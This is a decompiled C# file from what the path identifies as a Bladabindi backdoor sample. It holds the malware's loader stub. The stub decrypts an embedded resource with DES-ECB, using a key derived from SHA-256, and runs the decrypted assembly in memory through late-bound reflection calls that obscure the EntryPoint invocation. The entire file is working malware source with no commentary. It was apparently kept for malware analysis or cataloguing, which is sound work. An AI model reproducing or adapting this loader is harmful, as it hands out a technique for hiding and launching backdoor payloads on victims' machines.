// Decompiled with JetBrains decompiler
// Type: EE01.Module1
// Assembly: EE01, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C9CC5EA3-6042-4B01-8719-D7C7B134F8E5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Backdoor.MSIL.Bladabindi.gen-31efd625da819335f50f5ba78d7916c944a59ae371653e955405b5ca7ab6579a.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;

namespace EE01
{
  [StandardModule]
  internal sealed class Module1
  {
    [STAThread]
    public static void Main() => RuntimeHelpers.GetObjectValue(Versioned.CallByName(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Versioned.CallByName((object) AppDomain.CurrentDomain.Load(Module1.rety(EE01.My.Resources.Resources.Encryptedpc, (object) "rr", "p")), Conversions.ToString(Module1.z2()), (CallType) Conversions.ToInteger("EntryPoint"), (object) new object[1]
    {
      Module1.z2()
    }, Module1.z2(), Module1.z2()))), Conversions.ToString(Module1.z2()), (CallType) Conversions.ToInteger("Invoke"), (object) new object[2]
    {
      (object) "",
      Module1.z2()
    }, Module1.z2(), Module1.z2()));

    public static object z2() => (object) null;

    public static byte[] rety(byte[] B, object pp, string r)
    {
      DESCryptoServiceProvider cryptoServiceProvider1 = new DESCryptoServiceProvider();
      SHA256CryptoServiceProvider cryptoServiceProvider2 = new SHA256CryptoServiceProvider();
      byte[] numArray1 = new byte[8];
      SHA256CryptoServiceProvider Instance = cryptoServiceProvider2;
      object[] Arguments = new object[1];
      object[] objArray1;
      bool[] flagArray1;
      object obj = NewLateBinding.LateGet((object) Encoding.BigEndianUnicode, (Type) null, "GetBytes", objArray1 = new object[1]
      {
        pp
      }, (string[]) null, (Type[]) null, flagArray1 = new bool[1]
      {
        true
      });
      if (flagArray1[0])
        pp = RuntimeHelpers.GetObjectValue(objArray1[0]);
      Arguments[0] = obj;
      byte[] numArray2 = (byte[]) NewLateBinding.LateGet((object) Instance, (Type) null, "ComputeHash", Arguments, (string[]) null, (Type[]) null, (bool[]) null);
      object[] objArray2 = new object[2]{ null, (object) 0 };
      // ISSUE: variable of a reference type
      object& local1;
      // ISSUE: variable of a reference type
      object& local2;
      object[] objArray3;
      bool[] flagArray2;
      // ISSUE: explicit reference operation
      // ISSUE: explicit reference operation
      NewLateBinding.LateCall((object) null, typeof (Array), "Copy", objArray3 = new object[5]
      {
        (object) numArray2,
        ^(local1 = ref objArray2[1]),
        (object) numArray1,
        ^(local2 = ref objArray2[1]),
        (object) 8
      }, (string[]) null, (Type[]) null, flagArray2 = new bool[5]
      {
        true,
        true,
        true,
        true,
        false
      }, true);
      if (flagArray2[0])
      {
        byte[] numArray3 = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3[0]), typeof (byte[]));
      }
      if (flagArray2[1])
        local1 = RuntimeHelpers.GetObjectValue(objArray3[1]);
      if (flagArray2[2])
        numArray1 = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3[2]), typeof (byte[]));
      if (flagArray2[3])
        local2 = RuntimeHelpers.GetObjectValue(objArray3[3]);
      cryptoServiceProvider1.Key = numArray1;
      cryptoServiceProvider1.Mode = CipherMode.ECB;
      return (byte[]) RuntimeHelpers.GetObjectValue(new object[2]
      {
        null,
        (object) cryptoServiceProvider1.CreateDecryptor().TransformFinalBlock(B, 0, B.Length)
      }[1]);
    }
  }
}
